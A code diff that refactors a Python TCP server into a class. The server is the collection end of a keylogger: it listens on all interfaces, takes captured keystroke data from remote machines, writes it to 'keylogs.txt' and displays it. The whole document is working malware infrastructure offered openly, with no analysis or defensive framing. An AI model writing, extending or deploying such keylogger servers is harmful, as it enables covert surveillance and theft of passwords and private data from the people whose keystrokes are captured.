@@ -1,29 +1,49 @@
 import socket
 import os
 
-host = "0.0.0.0"
-port = 5005
+HOST = "0.0.0.0"
+PORT = 5005
 
-objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-objSocket.bind((host, port))
-objSocket.listen(socket.SOMAXCONN)
+class Server:
+    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-while (True):
-    try:
-        conn, address = objSocket.accept()
+    def __init__(self, host, port):
+        self.objSocket.bind((host, port))
+        self.objSocket.listen(socket.SOMAXCONN)
+        self.host = host
+        self.port = port
 
-        bufferSize = int(conn.recv(1024))
-        fileData = str(conn.recv(bufferSize), "utf-8")
+    def connect(self):
+        while (True):
+            try:
+                conn, address = self.objSocket.accept()
+                self.receive(conn, address)
 
-        with open("keylogs.txt", "w") as LogFile:
-            LogFile.write(fileData)
+            except socket.error:
+                print("[!] Failed Connecting to Remote Machine\n")
+                exit(1)
 
-        conn.close(); del(conn)
+    def receive(self, conn, address):
+        while (True):
+            try:
+                bufferSize = int(conn.recv(1024))
+                fileData = str(conn.recv(bufferSize), "utf-8")
 
-        os.system("clear" if os.name == "posix" else "cls")
-        print(fileData)
+                with open("keylogs.txt", "w") as LogFile:
+                    LogFile.write(fileData)
 
-    except socket.error:
-        print(f"[!] Failed to Connect to Remote Machine ~ {address[0]}\nAttempting to Reconnect...")
-    
-    finally: continue
+                os.system("clear" if os.name == "posix" else "cls")
+                print(fileData)
+
+                continue
+
+            except socket.error:
+                print(f"[!] Failed to Connect to Remote Machine ~ {address[0]}\nAttempting to Reconnect...")
+                conn.close(); del(conn)
+                break
+
+        self.connect
+
+server = Server(HOST, PORT)
+server.connect()
